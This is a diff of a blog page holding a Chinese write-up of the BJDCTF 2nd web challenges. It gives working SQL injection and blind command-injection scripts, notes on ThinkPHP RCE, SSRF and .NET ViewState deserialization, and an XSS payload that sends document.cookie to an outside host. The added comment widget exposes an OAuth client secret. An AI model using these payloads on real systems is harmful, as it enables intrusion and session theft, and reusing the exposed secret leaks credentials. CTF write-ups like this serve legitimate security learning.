@@ -11,22 +11,22 @@
   <meta name="author" content="kveln">
   <title>BJDCTF 2nd Web题解 |  </title>
   <link href="https://cdn.bootcss.com/twitter-bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet">
-  <!-- <link href="https://guokeya.github.io/media/css/bootstrap.min.css" rel="stylesheet"> -->
-  <!--  <link href="https://guokeya.github.io/media/css/all.min.css" rel="stylesheet" type="text/css"> -->
+  <!-- <link href="http://localhost:4000/media/css/bootstrap.min.css" rel="stylesheet"> -->
+  <!--  <link href="http://localhost:4000/media/css/all.min.css" rel="stylesheet" type="text/css"> -->
   <link href="https://cdn.bootcss.com/font-awesome/5.11.2/css/all.min.css" rel="stylesheet">
   <link href='https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
   <link href='https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>
-  <link rel="alternate" type="application/rss+xml" title="BJDCTF 2nd Web题解 |   » Feed" href="https://guokeya.github.io/atom.xml">
+  <link rel="alternate" type="application/rss+xml" title="BJDCTF 2nd Web题解 |   » Feed" href="http://localhost:4000/atom.xml">
   <link rel="stylesheet"href="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.10/build/styles/androidstudio.min.css">
-  <link href="https://guokeya.github.io/styles/main.css" rel="stylesheet">
+  <link href="http://localhost:4000/styles/main.css" rel="stylesheet">
   <script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"></script>
   <script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.10/build/highlight.min.js"></script>
-  <!-- <script src="https://guokeya.github.io/media/scripts/jquery.min.js"></script> -->
+  <!-- <script src="http://localhost:4000/media/scripts/jquery.min.js"></script> -->
   <script>hljs.initHighlightingOnLoad();</script>
   
 
     <meta property="og:description" content="BJDCTF 2nd Web题解"/>
-    <meta property="og:url" content="https://guokeya.github.io/post/5v8N4S11B/"/>
+    <meta property="og:url" content="http://localhost:4000/post/5v8N4S11B/"/>
     <meta property="og:locale" content="zh-CN"/>
     <meta property="og:type" content="website"/>
     <meta property="og:site_name" content=" "/>
@@ -35,7 +35,7 @@
   	<!-- Navigation -->
   <nav class="navbar navbar-expand-lg navbar-light fixed-top" id="mainNav">
     <div class="container">
-      <a class="navbar-brand" href="https://guokeya.github.io"> </a>
+      <a class="navbar-brand" href="http://localhost:4000"> </a>
       <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation">
         Menu
         <i class="fas fa-bars"></i>
@@ -72,7 +72,7 @@
     </div>
   </nav>
   <!-- Page Header -->
-  <header class="masthead" style="background-image: url('https://guokeya.github.io/media/images/home-bg.jpg')">
+  <header class="masthead" style="background-image: url('http://localhost:4000/media/images/home-bg.jpg')">
     <div class="overlay"></div>
     <div class="container">
       <div class="row">
@@ -80,9 +80,9 @@
           <div class="post-heading">
           	<span class="tags">
           	 
-            <a href="https://guokeya.github.io/tag/CTF/" class="tag">CTF</a>
+            <a href="http://localhost:4000/tag/CTF/" class="tag">CTF</a>
             
-            <a href="https://guokeya.github.io/tag/Web/" class="tag">Web安全</a>
+            <a href="http://localhost:4000/tag/Web/" class="tag">Web安全</a>
             
         </span>
             <h1>BJDCTF 2nd Web题解</h1>
@@ -103,20 +103,20 @@
         <div class="col-lg-8 col-md-10 mx-auto">
           <p><strong>[BJDCTF 2nd]fake google</strong><br>
 模板注入。不多说了。没过滤<br>
-<img src="https://guokeya.github.io/post-images/1584885032222.png" alt="" loading="lazy"></p>
+<img src="http://localhost:4000/post-images/1584885032222.png" alt="" loading="lazy"></p>
 <!-- more -->
 <p>这里推荐个工具<code>https://github.com/epinna/tplmap</code>直接拿shell<br>
-<img src="https://guokeya.github.io/post-images/1584885242822.png" alt="" loading="lazy"></p>
+<img src="http://localhost:4000/post-images/1584885242822.png" alt="" loading="lazy"></p>
 <p><strong>[BJDCTF 2nd]old-hack</strong><br>
 打开是个thinkphp的站<br>
-<img src="https://guokeya.github.io/post-images/1584885336657.png" alt="" loading="lazy"><br>
+<img src="http://localhost:4000/post-images/1584885336657.png" alt="" loading="lazy"><br>
 扫目录没东西。想起thinkphp有代码执行的洞<br>
-<img src="https://guokeya.github.io/post-images/1584885463011.png" alt="" loading="lazy"><br>
-<img src="https://guokeya.github.io/post-images/1584885489608.png" alt="" loading="lazy"></p>
+<img src="http://localhost:4000/post-images/1584885463011.png" alt="" loading="lazy"><br>
+<img src="http://localhost:4000/post-images/1584885489608.png" alt="" loading="lazy"></p>
 <p><strong>[BJDCTF 2nd]duangShell</strong><br>
 首先拿.index.php.swp缓存<br>
 vim -r index.php恢复<br>
-<img src="https://guokeya.github.io/post-images/1584885666165.png" alt="" loading="lazy"><br>
+<img src="http://localhost:4000/post-images/1584885666165.png" alt="" loading="lazy"><br>
 得到源码。这里直接给出我的payload</p>
 <pre><code>import requests
 import time
@@ -136,9 +136,9 @@ for a in range(1,100):
             break
 print(flag)
 </code></pre>
-<p><img src="https://guokeya.github.io/post-images/1584885951302.png" alt="" loading="lazy"><br>
+<p><img src="http://localhost:4000/post-images/1584885951302.png" alt="" loading="lazy"><br>
 还有其他方法。比如nc反弹shell/http数据带出/dns数据带出<br>
-<img src="https://guokeya.github.io/post-images/1584932054009.png" alt="" loading="lazy"></p>
+<img src="http://localhost:4000/post-images/1584932054009.png" alt="" loading="lazy"></p>
 <p><strong>[BJDCTF 2nd]简单注入</strong><br>
 听名字就知道是注入。<br>
 输入单引号双引号都被ban了<br>
@@ -165,7 +165,7 @@ for k in range(1,20):
 print(result)
 </code></pre>
 <p>得到密码登陆。拿到flag<br>
-<img src="https://guokeya.github.io/post-images/1584886724707.png" alt="" loading="lazy"><br>
+<img src="http://localhost:4000/post-images/1584886724707.png" alt="" loading="lazy"><br>
 预期解是。通过regexp 和binary配合。拿到密码<br>
 以下是Y1ng师傅的脚本</p>
 <pre><code>################################
@@ -212,32 +212,32 @@ for i in range(50):
 </code></pre>
 <p><strong>[BJDCTF 2nd]假猪套天下第一</strong><br>
 登陆得到hint<br>
-<img src="https://guokeya.github.io/post-images/1584886941603.png" alt="" loading="lazy"><br>
-<img src="https://guokeya.github.io/post-images/1584886968250.png" alt="" loading="lazy"><br>
+<img src="http://localhost:4000/post-images/1584886941603.png" alt="" loading="lazy"><br>
+<img src="http://localhost:4000/post-images/1584886968250.png" alt="" loading="lazy"><br>
 发现cookie中有time。修改time<br>
-<img src="https://guokeya.github.io/post-images/1584887061394.png" alt="" loading="lazy"><br>
+<img src="http://localhost:4000/post-images/1584887061394.png" alt="" loading="lazy"><br>
 要求localhost访问。Client-ip绕过<br>
-<img src="https://guokeya.github.io/post-images/1584887115792.png" alt="" loading="lazy"><br>
+<img src="http://localhost:4000/post-images/1584887115792.png" alt="" loading="lazy"><br>
 要求来源是gem-love.com。Refere绕过<br>
-<img src="https://guokeya.github.io/post-images/1584887170631.png" alt="" loading="lazy"><br>
+<img src="http://localhost:4000/post-images/1584887170631.png" alt="" loading="lazy"><br>
 要求用Commodo 64浏览器。UA头<br>
-<img src="https://guokeya.github.io/post-images/1584887212468.png" alt="" loading="lazy"><br>
+<img src="http://localhost:4000/post-images/1584887212468.png" alt="" loading="lazy"><br>
 要求用真的commodo 64UA头。<br>
-<img src="https://guokeya.github.io/post-images/1584887251571.png" alt="" loading="lazy"><br>
+<img src="http://localhost:4000/post-images/1584887251571.png" alt="" loading="lazy"><br>
 要求电子邮件为root@gem-love.com<br>
-<img src="https://guokeya.github.io/post-images/1584887313685.png" alt="" loading="lazy"><br>
+<img src="http://localhost:4000/post-images/1584887313685.png" alt="" loading="lazy"><br>
 要求代理为y1ng.vip<br>
-<img src="https://guokeya.github.io/post-images/1584887348499.png" alt="" loading="lazy"><br>
+<img src="http://localhost:4000/post-images/1584887348499.png" alt="" loading="lazy"><br>
 base64解码得到flag</p>
 <p><strong>[BJDCTF 2nd]Schrödinger</strong><br>
 扫描目录得到test.php需要用户名密码。<br>
 主页是个爆破功能。需要输入URL。<br>
 将http://5b3fecff-e167-4bd3-914f-be4ca8b44e92.node3.buuoj.cn/test.php输入。开始爆破<br>
 看到cookie中。有个base64。解码得到时间戳<br>
-<img src="https://guokeya.github.io/post-images/1584887546129.png" alt="" loading="lazy"><br>
+<img src="http://localhost:4000/post-images/1584887546129.png" alt="" loading="lazy"><br>
 尝试将时间戳改为0<br>
 进度到了99.然而始终未到100.要等很久。<br>
-<img src="https://guokeya.github.io/post-images/1584887606114.png" alt="" loading="lazy"><br>
+<img src="http://localhost:4000/post-images/1584887606114.png" alt="" loading="lazy"><br>
 猜测后台源码为当前时间戳-cookie中的时间戳=进度<br>
 这时想起小学数学老师的教导<br>
 10-1=9<br>
@@ -245,11 +245,11 @@ base64解码得到flag</p>
 负负得正。传入一个负数查看结果<br>
 输入-99999999<br>
 进度过了<br>
-<img src="https://guokeya.github.io/post-images/1584887729415.png" alt="" loading="lazy"><br>
+<img src="http://localhost:4000/post-images/1584887729415.png" alt="" loading="lazy"><br>
 点check按钮。得到密码<br>
-<img src="https://guokeya.github.io/post-images/1584887795517.png" alt="" loading="lazy"><br>
+<img src="http://localhost:4000/post-images/1584887795517.png" alt="" loading="lazy"><br>
 avxxx。去B站搜下<br>
-<img src="https://guokeya.github.io/post-images/1584887837724.png" alt="" loading="lazy"></p>
+<img src="http://localhost:4000/post-images/1584887837724.png" alt="" loading="lazy"></p>
 <p><strong>[BJDCTF 2nd]xss之光</strong><br>
 进去就gungungun。。。<br>
 扫目录得到git信息泄露</p>
@@ -265,7 +265,7 @@ echo unserialize($a);
 $a = new Exception(&quot;&lt;script&gt;window.location.href='http://www.baidu.com/?cookie=' document.cookie&lt;/script&gt;&quot;);
 echo urlencode(serialize($a));
 </code></pre>
-<figure data-type="image" tabindex="1"><img src="https://guokeya.github.io/post-images/1584888159506.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="1"><img src="http://localhost:4000/post-images/1584888159506.png" alt="" loading="lazy"></figure>
 <p><strong>[BJDCTF 2nd]elementmaster</strong><br>
 题目名叫元素大师。<br>
 源代码发现</p>
@@ -453,10 +453,10 @@ if(isset($_GET['file'])){
 继续对system.php审计。<br>
 接受三个参数q1/q2/q3<br>
 会读取q2。然后q3带入sprintf回显。<br>
-<img src="https://guokeya.github.io/post-images/1584922291497.png" alt="" loading="lazy"><br>
+<img src="http://localhost:4000/post-images/1584922291497.png" alt="" loading="lazy"><br>
 结合之前的admin.php只允许本地访问。可以造成SSRF。<br>
 读取一下。得到源码<br>
-<img src="https://guokeya.github.io/post-images/1584922469392.png" alt="" loading="lazy"></p>
+<img src="http://localhost:4000/post-images/1584922469392.png" alt="" loading="lazy"></p>
 <pre><code> &lt;?php
 error_reporting(0);
 session_start();
@@ -520,14 +520,14 @@ if (isset($_GET['decrypt'])) {
 。。下面就很简单了<br>
 构造密钥为空。那么aesEn函数是aesEn('','y1ng')<br>
 本地跑下就能知道结果<br>
-<img src="https://guokeya.github.io/post-images/1584923217521.png" alt="" loading="lazy"><br>
+<img src="http://localhost:4000/post-images/1584923217521.png" alt="" loading="lazy"><br>
 得到密钥。删除PHPSESSION。URL编码。得到flag</p>
 <p><strong>[BJDCTF 2nd]EasyAspDotNet</strong><br>
 首先图片的URL。可以知道这是个任意文件读取。然后搜到关键文件Web.config<br>
 至此。得到源码和web.config。<br>
-<img src="https://guokeya.github.io/post-images/1584963272305.png" alt="" loading="lazy"><br>
+<img src="http://localhost:4000/post-images/1584963272305.png" alt="" loading="lazy"><br>
 页面中发现两个隐藏的值。搜了下有个反序列化漏洞<br>
-<img src="https://guokeya.github.io/post-images/1584963304773.png" alt="" loading="lazy"><br>
+<img src="http://localhost:4000/post-images/1584963304773.png" alt="" loading="lazy"><br>
 照着嘶吼的一篇文章复现。没复现成功。<br>
 赛后赵总给出了个博客<br>
 <code>https://devco.re/blog/2020/03/11/play-with-dotnet-viewstate-exploit-and-create-fileless-webshell/</code><br>
@@ -537,11 +537,11 @@ if (isset($_GET['decrypt'])) {
 <p>得到反序列化的PAYLOAD<br>
 URL编码其中的加号等<br>
 替换执行命令<br>
-<img src="https://guokeya.github.io/post-images/1584963456024.png" alt="" loading="lazy"></p>
+<img src="http://localhost:4000/post-images/1584963456024.png" alt="" loading="lazy"></p>
 
           
           <p class="next-post">下一篇：
-            <a href="https://guokeya.github.io/post/eyYhRsEBx/">
+            <a href="http://localhost:4000/post/eyYhRsEBx/">
               <span class="post-title">
                 [GWCTF 2019]你的名字(SSTI)&rarr;
               </span>
@@ -550,6 +550,26 @@ URL编码其中的加号等<br>
         
         <div class="comment">
           
+          
+            <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+<div id="gitalk-container"></div>
+<script>
+  var gitalk = new Gitalk({
+    clientID: 'c07e068ab9501a423854',
+    clientSecret: '33e8ada317c799c9a4ca5cbbb2070ff5a423903b',
+    repo: 'Message',
+    owner: 'guokeya',
+    admin: ['guokeya'],
+    id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+    distractionFreeMode: false  // Facebook-like distraction free mode
+  })
+  gitalk.render('gitalk-container')
+</script>
+
+          
+          
+        
         </div>
       </div>
     </div>
@@ -585,7 +605,7 @@ URL编码其中的加号等<br>
             
               
               <li class="list-inline-item">
-              <a href="https://guokeya.github.io/atom.xml" target="_blank">
+              <a href="http://localhost:4000/atom.xml" target="_blank">
                 <span class="fa-stack fa-lg">
                   <i class="fas fa-circle fa-stack-2x"></i>
                   <i class="fas fa-rss fa-stack-1x fa-inverse"></i>
@@ -593,17 +613,17 @@ URL编码其中的加号等<br>
               </a>
               </li>
           </ul>
-          <p class="copyright text-muted">Copyright &copy;<span> </span><br><a href="https://github.com/getgridea/gridea" class="Themeinfo">Powered by Gridea</a></p>
+          <p class="copyright text-muted">Copyright &copy;<span> </span><br><a href="https://github.com/getgridea/gridea" class="Themeinfo">Powered by Gridea<br >浙ICP备2021000950号-1</a></p>
         </div>
       </div>
     </div>
    </footer>
   <!-- Bootstrap core JavaScript -->
   <script src="https://cdn.bootcss.com/twitter-bootstrap/4.3.1/js/bootstrap.bundle.min.js"></script>
-  <!-- <script src="https://guokeya.github.io/media/scripts/bootstrap.bundle.min.js"></script> -->
+  <!-- <script src="http://localhost:4000/media/scripts/bootstrap.bundle.min.js"></script> -->
   <!-- Bootstrap core JavaScript -->
   <script src="https://cdn.jsdelivr.net/gh/Alanrk/clean-cdn@1.0/scripts/clean-blog.min.js"></script>
-  <!-- <script src="https://guokeya.github.io/media/scripts/clean-blog.min.js"></script> -->
+  <!-- <script src="http://localhost:4000/media/scripts/clean-blog.min.js"></script> -->
   <script src="//instant.page/3.0.0" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>
   <style type="text/css">a.back_to_top{text-decoration:none;position:fixed;bottom:40px;right:30px;background:#f0f0f0;height:40px;width:40px;border-radius:50%;line-height:36px;font-size:18px;text-align:center;transition-duration:.5s;transition-propety:background-color;display:none}a.back_to_top span{color:#888}a.back_to_top:hover{cursor:pointer;background:#dfdfdf}a.back_to_top:hover span{color:#555}@media print,screen and(max-width:580px){.back_to_top{display:none!important}}</style>
 <a id="back_to_top" href="#" class="back_to_top">
